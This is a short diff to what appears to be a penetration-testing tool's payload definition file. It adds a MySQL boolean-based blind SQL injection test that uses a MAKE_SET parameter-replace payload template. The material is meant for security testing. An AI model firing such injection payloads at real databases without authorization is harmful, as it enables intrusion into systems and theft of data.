@@ -611,6 +611,22 @@ Formats:
     </test>
 
     <test>
+        <title>MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>MAKE_SET([INFERENCE],[ORIGVALUE])</vector>
+        <request>
+            <payload>MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE])</payload>
+        </request>
+        <response>
+            <comparison>MAKE_SET([RANDNUM]=[RANDNUM1],[ORIGVALUE])</comparison>
+        </response>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 5.0 boolean-based blind - Parameter replace</title>
         <stype>1</stype>
         <level>3</level>
